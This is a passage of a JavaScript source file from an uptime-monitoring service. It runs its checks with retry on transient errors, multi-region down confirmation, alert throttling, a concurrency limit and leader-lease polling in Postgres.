      if (!Number.isInteger(sp) || sp < 1 || sp > 65535) return { status: 'down', error: MON_ERR.PORT_INVALID };
      return checkSsl(target, sp, c.sslWarnDays || 30);
    }
    case 'domain': return checkDomain(target, c.domainWarnDays || 30);
    case 'api': return checkApi(target, c);
    case 'dns': return checkDns(target, c.recordType || 'A', c.expectedValues || []);
    case 'heartbeat': return checkHeartbeat(monitor);
    case 'ai': return checkAiVisibility(target, {
      fetchImpl: aiFetch,
      // 上一次快照（存在 config._ai.prev，用于生成「什么变了」）
      prev: (c._ai && c._ai.prev) || null,
      minTextChars: c.minTextChars,
    });
    case 'http':
    default: return checkHttp(target, c);
  }
}

// 瞬时失败判定：仅对超时 / 网络抖动类错误重试，不重试真实故障（HTTP 状态不符、关键字缺失、断言失败等）
function isTransientError(error) {
  if (!error) return false;
  const e = String(error).toLowerCase();
  return (
    e === 'timeout' ||
    e.includes('timeout') ||
    e.includes('econnreset') ||
    e.includes('econnrefused') ||
    e.includes('enotfound') ||
    e.includes('etimedout') ||
    e.includes('eai_again') ||
    e.includes('fetch failed') ||
    e.includes('socket hang up') ||
    e.includes('und_err') ||
    e.includes('network') ||
    e.includes('getaddrinfo')
  );
}

// 本地单点检查 + 瞬时失败单次重试：消除东京探针偶发抖动造成的假 down，避免 demo/状态页红标误报
// ③ 口径（Martin 2026-11-18）：responseTime 只记最后一次尝试自身的耗时——
// 失败尝试与 1.5s 重试等待不再计入，避免偶发抖动抬高均值、误触 slow 警告。
// 图表一致性靠日聚合平均自然平滑，不做人工平滑（不造数据）。
export async function runLocalCheckRetry(monitor) {
  let t0 = Date.now();
  let res = await runLocalCheck(monitor);
  if (res.status === 'down' && isTransientError(res.error)) {
    await new Promise((r) => setTimeout(r, 1500));
    t0 = Date.now();
    res = await runLocalCheck(monitor);
  }
  res.responseTime = res.responseTime ?? (Date.now() - t0);
  return res;
}

// 探针区域（G3）：默认单点；配置 PROBE_REGIONS 后多区域确认降误报
function getProbeRegions(plan) {
  const feats = planFeatures(plan);
  let regions = [];
  try { regions = JSON.parse(process.env.PROBE_REGIONS || '[]'); } catch { regions = []; }
  if (!Array.isArray(regions) || regions.length === 0) regions = [{ name: 'local', baseUrl: null }];
  if (!feats.multiRegion) regions = [regions[0]]; // 非付费档强制单点
  return regions;
}

// 多区域执行 + 确认逻辑
async function runCheck(monitor, plan) {
  const regions = getProbeRegions(plan);
  const confirm = Math.max(1, Math.ceil(regions.length / 2));
  let down = 0, lastError = null, lastRt = null, warn = null;
  let upDetail = null, downDetail = null;
  for (const r of regions) {
    const start = Date.now();
    let res;
    if (r.baseUrl) {
      // 委托给 worker 探针（部署多节点时使用）；未实现时回退本地
      try {
        const controller = new AbortController();
        const to = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS + 20000);
        const headers = { 'Content-Type': 'application/json' };
        if (process.env.PROBE_SECRET) headers['x-probe-secret'] = process.env.PROBE_SECRET;
        const resp = await fetch(`${r.baseUrl}/probe`, {
          method: 'POST',
          headers,
          body: JSON.stringify({ monitor, region: r.name }),
          signal: controller.signal,
        });
        clearTimeout(to);
        res = await resp.json();
      } catch {
        res = { status: 'down', error: `探针 ${r.name} 不可达` };
      }
    } else {
      res = await runLocalCheckRetry(monitor);
    }
    res.responseTime = res.responseTime ?? (monitor.type === 'heartbeat' ? null : Date.now() - start);
    if (res.status === 'down') { down++; lastError = res.error; if (res.detail) downDetail = res.detail; }
    else if (!upDetail && res.detail) upDetail = res.detail;
    if (res.responseTime != null) lastRt = res.responseTime;
    if (res.warn) warn = res.warn;
  }
  const status = down >= confirm ? 'down' : 'up';
  // D41：detail 必须透传 —— 否则 score / matrix / fingerprint / changes 全在
  // runCheck 这一层被丢掉，AI 监控和历史面板都拿不到东西（二审第 9 条）
  return {
    status,
    responseTime: lastRt,
    error: status === 'down' ? lastError : null,
    warn,
    regions: regions.length,
    detail: status === 'down' ? (downDetail || upDetail) : (upDetail || downDetail),
  };
}

// ============================================================
// AI 可读性专用：告警指纹门控 + 连续 unknown 计数（D41）
// ============================================================
// 为什么不能直接用 warnFresh：它是「距上次 >10 分钟即再发」，没有内容比较 ⇒
// 只要状态持续 warn，就每 10 分钟发一条，一天 144 条。而真正在意的是「变了没有」。
// 状态存在 monitor.config._ai（JSON TEXT）里，零 DB 迁移（Worker 不跑 DDL）。
const AI_UNKNOWN_WARN_TEXT = 'AI checks could not run: your site returned a bot-protection challenge to our crawler. Add Pingory to your allowlist.';

// 导出仅供单测（D41）：告警指纹门控是纯函数，不碰 DB
export function applyAiWarnGate(monitor, detail, prevWarnAt) {
  const now = Date.now();
  const cooled = now - prevWarnAt > 10 * 60 * 1000;

  if (!monitor.config || typeof monitor.config !== 'object') monitor.config = {};
  const cfg = monitor.config;
  if (!cfg._ai || typeof cfg._ai !== 'object') cfg._ai = {};
  const st = cfg._ai;

  let warnFresh = false;
  let warnText = null;

  if (!detail) return { warnFresh: false, warnText: null };

  if (detail.unknown) {
    // 被 WAF 拦不是故障，但连续 3 次都测不到，用户该知道了 —— 只提醒一次
    st.unk = (st.unk || 0) + 1;
    if (st.unk >= 3 && !st.unw) {
      warnFresh = cooled;
      if (cooled) { st.unw = true; warnText = AI_UNKNOWN_WARN_TEXT; }
    }
    // 测不到时不推进指纹：等能测到时再和「上次真实状态」比
  } else {
    st.unk = 0;
    st.unw = false;
    const fp = detail.fingerprint || null;
    const changed = !!fp && fp !== (st.fp || null);
    warnFresh = changed && cooled;
    // 只在冷却允许时前移指纹 ⇒ 被冷却挡下的变化会在下一个检查点补发，不会被静默吞掉
    if (changed && cooled) st.fp = fp;
  }

  // 上一次快照（只存 diff 需要的三个字段，避免 config 膨胀）
  st.prev = { status: detail.status || null, matrix: detail.matrix || {}, snapshot: detail.snapshot || null };

  // 面板用的紧凑快照：12 项 + 分数 + 变更，message 截断到 200 字符
  if (Array.isArray(detail.items)) {
    st.snap = {
      at: detail.checkedAt || new Date(now).toISOString(),
      score: detail.score,
      status: detail.status,
      unknown: !!detail.unknown,
      reason: detail.reason || null,
      blockedBy: detail.blockedBy || null,
      changes: (detail.changes || []).slice(0, 5),
      items: detail.items.map((i) => ({
        k: i.key,
        s: i.status,
        r: (i.detail && i.detail.reason) || null,
        m: String(i.message || '').slice(0, 200),
      })),
    };
  }

  return { warnFresh, warnText };
}

// ============================================================
// 检查调度
// ============================================================
// 导出供 scheduled()（Worker cron）复用同一套检查 + 告警状态机（增量导出，Fly 路径不受影响）
export async function checkMonitor(monitor) {
  const plan = await getPlan(monitor.userId);
  const start = Date.now();
  const result = await runCheck(monitor, plan);
  const responseTime = result.responseTime;

  const prevStatus = monitor.status;
  const changed = prevStatus !== result.status;

  // 连续失败计数（用于"真正宕机才告警"降误报）：Free 单区需连续 2 次失败，
  // 付费档 1 次（多区域时 runCheck 已做过多数确认，无需再加门槛）
  let consecutiveFailures = monitor.consecutiveFailures || 0;
  if (result.status === 'down') consecutiveFailures += 1;
  else consecutiveFailures = 0;
  monitor.consecutiveFailures = consecutiveFailures;
  const confirmThreshold = plan === 'free' ? 2 : 1;
  const downConfirmed = result.status === 'down' && consecutiveFailures >= confirmThreshold;

  // 慢响应 / 即将过期等 warning（不改变 status，但触发一次告警）
  const prevWarnAt = slowState.get(monitor.id) || 0;

  // AI 类型走指纹门控：同指纹不重发；指纹变化才告警（详见 applyAiWarnGate）
  let aiGate = null;
  if (monitor.type === 'ai') {
    aiGate = applyAiWarnGate(monitor, result.detail || null, prevWarnAt);
    if (aiGate.warnText && !result.warn) {
      // 连续 3 次测不到 ⇒ 一次性提醒（不是故障，是「我们看不见」）
      result.warn = aiGate.warnText;
      if (result.detail) result.detail.unknownWarn = true;
    }
  }

  const isWarn = !!result.warn;
  const warnFresh = isWarn && (aiGate ? aiGate.warnFresh : Date.now() - prevWarnAt > 10 * 60 * 1000);
  if (warnFresh) slowState.set(monitor.id, Date.now());
  const prevSlow = slowState.get(monitor.id + ':slow');
  const slowThreshold = monitor.config?.slowThresholdMs;
  const isSlow = result.status === 'up' && slowThreshold && responseTime != null && responseTime > slowThreshold;
  if (isSlow) slowState.set(monitor.id + ':slow', Date.now());
  else if (!isSlow) slowState.delete(monitor.id + ':slow');

  monitor.status = result.status;
  monitor.lastChecked = Date.now();
  monitor.lastResponseTime = responseTime;
  monitor.lastError = result.error;

  // P0-S4：这里**不得**刷新 lastSuccessAt。
  // 它代表「客户端最后一次上报时间」，只有 POST /api/heartbeat/:id 能写；
  // 若检查时把 up 写回当前时间，dead-man 会每轮自我续命 ⇒ 客户端真停了也不告警。
  // （saveMonitor 对 heartbeat 类型也已跳过该列，双保险。）

  await saveMonitor(monitor);
  await saveCheck(monitor.id, {
    ts: monitor.lastChecked,
    status: result.status,
    responseTime,
    region: result.regions > 1 ? 'multi' : 'local',
    error: result.error,
  });

  if (onCheckResult) {
    onCheckResult(monitor, { ...result, responseTime, warn: isWarn ? result.warn : null }, {
      prevStatus,
      changed,
      downConfirmed,
      isWarn,
      warnFresh,
      isSlow,
      prevSlow: !!prevSlow,
    });
  }
}

// 启动轮询
const inFlight = new Set(); // 防止同一监控并发检查（检查耗时可能 > 轮询间隔）

// ===== 总并发上限（P1-⑤，2026-09-23）=====
// 旧实现只防「同一监控重复检查」（inFlight），不防「总并发数」：
// 到期监控一多，同一瞬间会起 N 个 checkMonitor，而每个检查结尾要 saveMonitor(UPDATE) + saveCheck(INSERT)，
// 各占一次连接 ⇒ N 超过池容量时池被占满，全站 API 跟着排队（P0 之前是永久挂起，现在会 503）。
// 这里加一道全局信号量：同时进行的检查数不超过 POLL_MAX_CONCURRENT。
// 取值说明：池 max=6/实例，而一次检查里「长时间等待」的是 HTTP 请求（不占连接），
// 只有头尾两次写库短暂占连接 ⇒ 上限 8 仍远低于池容量被长期占满的水平。
const POLL_MAX_CONCURRENT = Math.max(1, Number(process.env.POLL_MAX_CONCURRENT || 8));
// 单轮最多取多少条到期监控（P1-④ 的批上限，避免一次把全表拉进内存）
const POLL_BATCH_LIMIT = Math.max(1, Number(process.env.POLL_BATCH_LIMIT || 200));
let activeChecks = 0;

// ===== Leader 租约（P1-12）=====
// 多实例（Fly 双机）下只允许一个实例跑轮询：否则两台机器各自检查、各自派发告警
// ⇒ 每封告警发两份，且内存级冷却（slowState）在双实例下失效。
// 租约落库（双实例共享），leader 每 5 秒续租、TTL 30 秒；leader 挂掉后另一实例在 ≤30s 内接管。
const LEASE_NAME = 'poll';
const LEASE_TTL_SEC = 30;
let _instanceId = null;
function instanceId() {
  if (_instanceId === null) {
    _instanceId = `${os.hostname()}-${process.pid}-${crypto.randomBytes(3).toString('hex')}`;
  }
  return _instanceId;
}
let isLeader = false;

// 供其它定时任务（如数据保留清理）复用同一把 leader 租约，避免双机重复劳动
export function isPollLeader() {
  return isLeader;
}

// 尝试取得/续租 leader 租约；返回 true = 本实例当前持有租约。
// holder/name 参数化以便测试模拟多实例竞争（生产用默认值）。
export async function tryAcquireLease(holder = instanceId(), name = LEASE_NAME) {
  const pool = await getPool();
  const { rows } = await pool.query(
    `INSERT INTO leader_lease (name, holder, expires_at)
     VALUES ($1, $2, now() + make_interval(secs => $3))
     ON CONFLICT (name) DO UPDATE
       SET holder = $2, expires_at = now() + make_interval(secs => $3)
       WHERE leader_lease.holder = $2 OR leader_lease.expires_at < now()
     RETURNING holder`,
    [name, holder, LEASE_TTL_SEC]
  );
  return rows.length > 0;
}

export function startPolling() {
  const timer = setInterval(async () => {
    // 整个 tick 包在 try/catch 里：轮询回调不是路由，抛出去会变成 unhandled rejection
    // ⇒ 进程级兜底会记录堆栈后退出（宁可退出也别静默，但这类周期性任务不该拖垮整个服务）。
    try {
      // 1) 竞争 / 续租 leader（仅 leader 才继续往下扫描）
      try {
        const won = await tryAcquireLease();
        if (won && !isLeader) {
          isLeader = true;
          console.log(`[poll] 本实例取得 leader 租约，开始轮询 (${instanceId()})`);
        } else if (!won && isLeader) {
          isLeader = false;
          console.warn(`[poll] leader 租约丢失，转为 standby (${instanceId()})`);
        }
      } catch (e) {
        // 租约表查询失败时不改变当前角色（避免网络抖动导致频繁切换）
        console.error('[poll] 租约检查失败:', e.message);
      }
      if (!isLeader) return; // standby：不扫描、不派发告警

      // 2) 扫描到期监控（仅 leader 执行）—— P1-④：只取到期的那批，不再全表扫
      const due = await listDueMonitors(Date.now(), POLL_BATCH_LIMIT);

      // 3) 派发检查，受总并发上限约束（P1-⑤）
      for (const m of due) {
        if (activeChecks >= POLL_MAX_CONCURRENT) break; // 并发已满：其余留给下一轮（按 last_checked 升序，最久未查的优先）
        if (inFlight.has(m.id)) continue;               // 上一次检查还没完成，跳过
        inFlight.add(m.id);
        activeChecks += 1;
        checkMonitor(m)
          .catch((e) => console.error('[poll] 检查失败', m.id, e.message))
          .finally(() => { inFlight.delete(m.id); activeChecks -= 1; });
      }
    } catch (e) {
      console.error('[poll] 轮询周期异常（不中断，下一轮继续）:', e && e.message);
    }
  }, 5000);
  // 与项目其它定时器保持一致：不阻止进程退出
  if (timer.unref) timer.unref();
  return timer;
}
